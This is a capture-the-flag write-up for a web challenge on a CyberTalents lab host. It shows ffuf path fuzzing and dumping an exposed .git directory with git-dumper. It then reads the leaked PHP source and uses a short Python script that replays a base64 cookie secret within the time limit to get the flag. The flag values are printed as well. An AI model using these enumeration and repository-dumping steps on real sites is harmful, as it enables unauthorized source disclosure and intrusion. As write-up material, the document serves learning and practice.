## first we have apache page , lets try to request robots.txt , i found this msg 
```
hint: git gud to solve this challenge ;)
```

## using any tool u can try to bruteforce paths related to git  , i found `.git`
```bash
$ ffuf -u "http://wcamxwl32pue3e6m5l3n94wbq36ondvjrx94fezy-web.cybertalentslabs.com/FUZZ" -w raft-small-files-lowercase.txt -fs 330

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://wcamxwl32pue3e6m5l3n94wbq36ondvjrx94fezy-web.cybertalentslabs.com/FUZZ
 :: Wordlist         : FUZZ: /home/h4z3/Downloads/lists/SecLists-master/Discovery/Web-Content/raft-small-files-lowercase.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 330
________________________________________________

[Status: 200, Size: 812, Words: 101, Lines: 32, Duration: 213ms]
    * FUZZ: index.php

[Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 225ms]
    * FUZZ: index.html

[Status: 200, Size: 913, Words: 140, Lines: 37, Duration: 881ms]
    * FUZZ: style.css

[Status: 200, Size: 41, Words: 8, Lines: 2, Duration: 226ms]
    * FUZZ: robots.txt

[Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 235ms]
    * FUZZ: .

[Status: 301, Size: 417, Words: 20, Lines: 10, Duration: 735ms]
    * FUZZ: .git

```
## there is a dirctory listing
![Screenshot 2023-08-03 at 19-20-10 Index of _ git](https://github.com/kiro6/writeups-ctfs/assets/57776872/8f415792-90f8-4110-9736-efc4a27a592b)

## using git-dumber
```bash
$ git-dumper "http://wcamxwl32pue3e6m5l3n94wbq36ondvjrx94fezy-web.cybertalentslabs.com/.git/"  .

$ ls
index.php  README.md  robots.txt  style.css
```

## read index.php  
```php
<!DOCTYPE html>
<html lang="en" >
<head>
  <meta charset="UTF-8">
  <title>CodePen - CSS+SVG Motion Blur Text Effect</title>
  <link rel="stylesheet" href="./style.css">

</head>
<body>
<!-- partial:index.partial.html -->
<svg xmlns="http://www.w3.org/2000/svg">
  
  <!-- filterUnits is required to prevent clipping the blur outside the viewBox -->
  
    <filter id="motion-blur-filter" filterUnits="userSpaceOnUse">
      
      <!-- We only want horizontal blurring. x: 100, y: 0 -->
      
        <feGaussianBlur stdDeviation="100 0"></feGaussianBlur>
    </filter>
</svg>


<?php 
Session_start();




function mstime(){
  
  return round(microtime(true) * 1000);
}

function generateRandomString($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}



if(!isset($_SESSION['flooog']) and !isset($_COOKIE['secret'])) {
    $flog=generateRandomString();
    $_SESSION['flooog'] = $flog;
    $_SESSION['counter'] = mstime();
    setcookie("secret",base64_encode($flog));

    
    
}



 

if (isset($_POST['Q'])) {
  if ($_POST['Q']== $_SESSION['flooog']) {

    if (  (mstime() - $_SESSION['counter']) < 2999  ){

    echo '<span filter-content="S">You won against sonic!!! GJ Here is a flag for you: flag{f4k3_fl4g}</span>';

    }else{

 echo '<span filter-content="S">cmon.. do you call this speed?</span>';

    }

  }else{

 echo '<span filter-content="S">The encoded secret you provided is wrong :( Sonic is not impressed</span>';

    echo "\n";
  }
  


}else{

 echo "\n";
 echo '<span filter-content="S">Q parameter is not set!</span>';
  echo '<span filter-content="S">Challenge suspended</span>';


}
?>

 

<!-- partial -->
  <script src='https://cdnjs.cloudflare.com/ajax/libs/vue/2.6.12/vue.min.js'></script>
</body>
</html>
```

## so to get the flag we have to do 2 things
- send post request containing paramter `Q` with the same value of secret cookie after base64 decode it
- the post request must be sent in less than 2999 milliseconds after the session started

## we can do that using burp sequencer or make our own script , making script is much easier for me 
```python
import urllib.parse as parse
import requests 
import base64



url ='http://wcamxwl32pue3e6m5l3n94wbq36ondvjrx94fezy-web.cybertalentslabs.com/index.php'
reqWithSession = requests.Session()
res1 = reqWithSession.get(url)  #get the cookie
secretCookie = base64.b64decode(parse.unquote(res1.cookies['secret'])) #extract cookie from the response , url decode it , then base64 decode it
data = {"Q": secretCookie} 
res2 = reqWithSession.post(url=url , data=data) # send request with Q paramter and secret value
print(res2.text)
```

## result 
```bash
$ python3 sonic.py                                                                                                                                                                               1 ↵
<!DOCTYPE html>
<html lang="en" >
<head>
  <meta charset="UTF-8">
  <title>CodePen - CSS+SVG Motion Blur Text Effect</title>
  <link rel="stylesheet" href="./style.css">

</head>
<body>
<!-- partial:index.partial.html -->
<svg xmlns="http://www.w3.org/2000/svg">
  
  <!-- filterUnits is required to prevent clipping the blur outside the viewBox -->
  
    <filter id="motion-blur-filter" filterUnits="userSpaceOnUse">
      
      <!-- We only want horizontal blurring. x: 100, y: 0 -->
      
        <feGaussianBlur stdDeviation="100 0"></feGaussianBlur>
    </filter>
</svg>


<span filter-content="S">You won against sonic!!! GJ Here is a flag for you: flag{s0n1c_isnt_that_fast_after_all}</span>
 

<!-- partial -->
  <script src='https://cdnjs.cloudflare.com/ajax/libs/vue/2.6.12/vue.min.js'></script>
</body>
</html>
```

## and here is our flage
```
flag{s0n1c_isnt_that_fast_after_all}
```
